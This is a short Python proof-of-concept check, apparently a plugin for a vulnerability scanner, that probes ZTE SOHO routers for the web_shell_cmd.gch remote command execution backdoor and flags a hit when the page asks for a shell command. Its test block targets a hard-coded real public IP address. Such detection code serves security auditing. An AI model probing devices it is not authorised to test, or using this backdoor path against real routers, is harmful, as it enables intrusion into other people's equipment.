#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  ZTE SOHO ROUTER web_shell_cmd.gch Backdoor 
Reference :  http://blog.knownsec.com/2015/01/analysis-of-zte-soho-routerweb_shell_cmd-gch-remote-command-execution/
Author    :  NoName
"""

import  re

def assign(service, arg):
    if service == "ip":
        return True, arg
        
def audit(arg):
    payload = "web_shell_cmd.gch"
    code, head, res, errcode, _ = curl.curl(arg + payload)
    if code == 200 and 'please input shell command' in res:
        security_hole(arg+payload)

if __name__ == '__main__':
    from dummy import *
    audit(assign('ip', 'http://106.127.138.8/')[1])